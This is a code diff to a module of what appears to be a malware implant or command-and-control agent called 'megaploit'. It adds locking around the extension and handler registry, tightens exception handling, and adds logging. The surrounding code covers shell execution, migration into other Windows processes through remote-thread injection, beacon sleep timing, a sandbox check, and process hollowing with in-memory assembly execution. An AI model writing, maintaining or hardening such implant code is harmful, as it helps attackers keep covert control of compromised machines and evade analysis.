@@ -41,7 +41,7 @@ import time
 import types
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from megaploit.agent.handlers import _register, _shell_exec, get_send_lock  # shared registry
+from megaploit.agent.handlers import _register, _shell_exec, get_send_lock, _handlers_lock  # shared registry
 from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file
 
 
@@ -138,8 +138,12 @@ def _migrate_windows(pid: int) -> str:
                     k32.CloseHandle(h_thread)
                     k32.CloseHandle(h_proc)
                     return f"[+] Migrated to PID {pid} via PyRun_SimpleString remote thread"
-        except Exception:
-            pass
+        except OSError as _inner_exc:
+            # Target process does not have Python loaded; fall through to
+            # detached-subprocess fallback.  Log the reason so it is visible
+            # in debug output rather than being silently discarded.
+            import logging as _log
+            _log.getLogger(__name__).debug("migrate PyRun_SimpleString skipped: %s", _inner_exc)
 
         # Fallback: spawn detached python.exe re-running the agent
         k32.CloseHandle(h_proc)
@@ -389,6 +393,10 @@ def _run_python(conn, args: list[str]) -> str:
 # ---------------------------------------------------------------------------
 
 _extensions: dict[str, types.ModuleType] = {}
+# Guards concurrent access to _extensions.  We reuse _handlers_lock (imported
+# from handlers) for mutations to _HANDLERS so that all paths — including any
+# future direct callers in handlers.py — share a single authoritative lock.
+_registry_lock = _handlers_lock
 
 
 @_register("load_extension")
@@ -419,15 +427,16 @@ def _load_extension(conn, args: list[str]) -> str:
             mod = importlib.import_module(name_or_path)
             mod_name = name_or_path
 
-        _extensions[mod_name] = mod
-
-        # Auto-register any handlers the extension exports
+        # Auto-register any handlers the extension exports — hold lock for the
+        # entire read-modify-write to _extensions and _HANDLERS.
         registered: list[str] = []
         ext_handlers = getattr(mod, "HANDLERS", {})
         from megaploit.agent.handlers import _HANDLERS
-        for verb, fn in ext_handlers.items():
-            _HANDLERS[verb] = fn
-            registered.append(verb)
+        with _registry_lock:
+            _extensions[mod_name] = mod
+            for verb, fn in ext_handlers.items():
+                _HANDLERS[verb] = fn
+                registered.append(verb)
 
         if registered:
             return f"[+] Extension '{mod_name}' loaded — verbs: {', '.join(registered)}"
@@ -445,16 +454,13 @@ def _unload_extension(conn, args: list[str]) -> str:
     if not args:
         return "Usage: unload_extension <module_name>"
     name = args[0]
-    mod  = _extensions.pop(name, None)
-    if mod is None:
-        return f"[-] Extension '{name}' not loaded"
-
     from megaploit.agent.handlers import _HANDLERS
-    ext_handlers = getattr(mod, "HANDLERS", {})
-    removed = []
-    for verb in ext_handlers:
-        if _HANDLERS.pop(verb, None) is not None:
-            removed.append(verb)
+    with _registry_lock:
+        mod = _extensions.pop(name, None)
+        if mod is None:
+            return f"[-] Extension '{name}' not loaded"
+        ext_handlers = getattr(mod, "HANDLERS", {})
+        removed = [verb for verb in ext_handlers if _HANDLERS.pop(verb, None) is not None]
     return f"[+] Extension '{name}' unloaded — verbs removed: {removed or '(none)'}"
 
 
@@ -750,15 +756,11 @@ def _beacon_sleep(conn, args: list[str]) -> str:
     if not args or not args[0].isdigit():
         return "Usage: beacon_sleep <seconds>"
     secs = max(0, min(int(args[0]), 3600))
-    try:
-        from megaploit.core import config as _cfg
-        _cfg.RECONNECT_DELAY = max(secs, 1)  # type: ignore[attr-defined]
-        # Also update the shell-loop sleep variable in handlers module
-        from megaploit.agent import handlers as _hdl
-        _hdl._beacon_sleep = float(secs)
-        return f"[+] Beacon sleep set to {secs}s"
-    except Exception as exc:
-        return f"[-] beacon_sleep: {exc}"
+    from megaploit.core import config as _cfg
+    from megaploit.agent import handlers as _hdl
+    _cfg.RECONNECT_DELAY = max(secs, 1)  # type: ignore[attr-defined]
+    _hdl._beacon_sleep = float(secs)
+    return f"[+] Beacon sleep set to {secs}s"
 
 
 # ---------------------------------------------------------------------------
@@ -893,5 +895,10 @@ def _sandbox_check(conn, args: list[str]) -> str:
 # ---------------------------------------------------------------------------
 try:
     import megaploit.agent.hollowing  # noqa: F401  — registers process_hollow + execute_assembly
-except Exception:  # pragma: no cover — Windows-only, OK to skip on non-Windows
+except ImportError:  # pragma: no cover — Windows-only optional dependency
     pass
+except Exception as _hollowing_exc:  # pragma: no cover — unexpected load error; surface it
+    import logging as _log
+    _log.getLogger(__name__).warning(
+        "hollowing module failed to load: %s", _hollowing_exc, exc_info=True
+    )
